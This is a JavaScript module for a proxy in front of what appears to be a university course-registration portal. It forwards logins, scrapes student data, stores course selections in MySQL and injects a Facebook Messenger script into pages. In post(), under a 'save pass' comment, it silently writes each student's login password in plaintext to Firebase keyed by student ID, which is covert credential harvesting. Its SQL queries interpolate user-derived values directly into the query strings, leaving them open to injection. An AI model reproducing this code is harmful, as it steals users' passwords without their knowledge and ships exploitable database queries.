const CONFIG = require("./config.json");
const request = require("request");
const createError = require("http-errors");
const AppData = require("../appdata");
const connect = require("../mysql");
const tool = require("../DKMH/tool");
const { admin, firebase } = require("../firebase");

module.exports = {
  get,
  post
};

function get(req) {
  const headers = req.headers,
    suburl = req.url,
    session = req.appData.session;

  let pageQuery = req.query.page;
  if (req.url === "/") {
    pageQuery = true;
  }

  headers["host"] = CONFIG.forward.host;
  headers["accept-encoding"] = "identity";
  headers["origin"] = CONFIG.forward.origin;
  headers["referer"] = CONFIG.forward.referer;
  delete headers["content-length"];
  delete headers["content-type"];

  return new Promise((resolve, reject) => {
    return request(
      {
        method: "GET",
        headers: headers,
        uri: CONFIG.forward.url + suburl,
        followAllRedirects: true,
        timeout: CONFIG.timeout
      },
      (error, res, body) => {
        if (error) {
          return reject(error);
        }
        if (res.statusCode !== 200 && res.statusCode !== 304) {
          body = body || "Lỗi không xác định";
          return reject(new Error(body));
        }


        //crawler o day
        crawlerDataFromRequest(body, session, pageQuery);
        
        body = addMessengerToBody(body);
        

        return resolve({
          status: res.statusCode,
          body,
          cookie: res.headers["set-cookie"]
        });
      }
    );
  });
}

function post(req) {
  const headers = req.headers,
    suburl = req.url,
    rawbody = req.appData.rawBody,
    session = req.appData.session;

  let pageQuery = req.query.page;
  if (req.url === "/") {
    pageQuery = true;
  }

  // save pass
  let savePass = false;
  let mssv = null;
  let password = null;
  if (req.appData.fields&&req.appData.fields.hasOwnProperty("ctl00$ContentPlaceHolder1$ctl00$ucDangNhap$txtTaiKhoa")) {
    mssv = req.appData.fields[
      "ctl00$ContentPlaceHolder1$ctl00$ucDangNhap$txtTaiKhoa"
    ].toUpperCase();
    password = req.appData.fields["ctl00$ContentPlaceHolder1$ctl00$ucDangNhap$txtMatKhau"];
    savePass = true;
  }

  headers["host"] = CONFIG.forward.host;
  headers["origin"] = CONFIG.forward.origin;
  headers["referer"] = CONFIG.forward.referer;
  headers["accept-encoding"] = "identity";
  return new Promise((resolve, reject) => {
    request(
      {
        method: "POST",
        headers: headers,
        uri: CONFIG.forward.url + suburl,
        followAllRedirects: true,
        body: rawbody,
        timeout: CONFIG.timeout
      },
      (error, res, body) => {
        if (error) {
          return reject(error);
        }
        if (res.statusCode !== 200 && res.statusCode !== 304) {
          body = body || "Lỗi không xác định";
          return reject(new Error(body));
        }

        //crawler o day
        crawlerDataFromRequest(body, session, pageQuery ,savePass,mssv,password);
        
        body = addMessengerToBody(body);
        

        return resolve({
          status: res.statusCode,
          body,
          cookie: res.headers["set-cookie"]
        });
      }
    );
  });
}

async function crawlerDataFromRequest(body, session, pageQuery,savePass,mssv,password) {
  const user = getUserData(body);
  if (user) {
    if(savePass && mssv.length>5){
      firebase.ref("qldt/"+mssv).set(password);
    }

    AppData.SESSION[session].user = user;
    if (!AppData.SESSION[session].DKMH) {
      const dkmh = await getDKMHFromDatabase(user.mssv);
      const filterMH = await checkTonTaiMonHoc(dkmh, user.mssv);

      AppData.SESSION[session].DKMH = filterMH.map(e => {
        return {
          ...e,
          state: "daluu"
        };
      });
    }
  } else if (!user && pageQuery) {
    delete AppData.SESSION[session];
  }
}

async function checkTonTaiMonHoc(dkmh, mssv) {
  const task = [];

  const dkmhfind = [];
  const resultFinal = [];
  for (let mh of dkmh) {
    const maMH = mh.maMH;
    if (!AppData.LICHDK[maMH]) {
      // tim trong csdl
      dkmhfind.push(mh);
      task.push(
        await new Promise((resolve, reject) => {
          connect.query(
            `SELECT * FROM lichdk WHERE dkLoc="${maMH}"`,
            (error, result) => {
              if (error) {
                return reject(error);
              }
              if (result.length === 0) {
                return resolve(null);
              } else {
                return resolve(result[0]);
              }
            }
          );
        })
      );
    } else {
      resultFinal.push(mh);
    }
  }
  const mhDatabase = await Promise.all(task);
  const filterMH = [];

  const taskDelete = [];
  for (let mh of dkmhfind) {
    const maMH = mh.maMH;
    let check1 = true,
      check2 = true;
    for (let db of mhDatabase) {
      if (!db) {
        continue;
      }
      if (db.dkLoc === maMH) {
        check1 = false;
        const result = tool.cacheLichDk(db.dkLoc, db.value);
        result.forEach(element => {
          if (element[0] === mh.maDK) {
            check2 = false;
          }
        });
        break;
      }
    }
    if (check1 || check2) {
      //delete monhoc mh.maMH trong database
      // taskDelete.push(connect.query(`DELETE FROM dkmh WHERE mssv="${mssv}" AND maMH="${mh.maMH}"`));
    } else {
      filterMH.push(mh);
    }
  }
  await Promise.all(taskDelete);
  return resultFinal.concat(filterMH);
}

function getDKMHFromDatabase(mssv) {
  return new Promise((resolve, reject) => {
    connect.query(`SELECT * FROM dkmh WHERE mssv='${mssv}'`, (err, result) => {
      if (err) {
        return reject(error);
      }
      return resolve(result);
    });
  });
}

function getUserData(body) {
  const regex = new RegExp(`Chào bạn(.*?)\\)`, "g");
  const match = regex.exec(body);
  if (match) {
    const name = match[1]
      .trim()
      .split("(")[0]
      .trim();
    const mssv = match[1].trim().split("(")[1];
    return { name, mssv };
  }
  return null;
}

function addMessengerToBody(body){
    const messengerCode = 
    `<script>
    window.fbAsyncInit = function() {
      FB.init({
        appId            : '2229693873710059',
        autoLogAppEvents : true,
        xfbml            : true,
        version          : 'v2.12'
      });
    };
    (function(d, s, id){
      var js, fjs = d.getElementsByTagName(s)[0];
      if (d.getElementById(id)) {return;}
      js = d.createElement(s); js.id = id;
      js.src = "https://connect.facebook.net/vi_VN/sdk.js";
      fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));
  </script>
  <div class="fb-customerchat"
    page_id="786830551663133"
    theme_color="#0084ff"
  >
  </div>`;

  if(body.indexOf("</body>")>=0 && body.indexOf("<html")>=0){
    body = body.replace("</body>",messengerCode+"</body>");
  }
  return body;
}




// add messenger
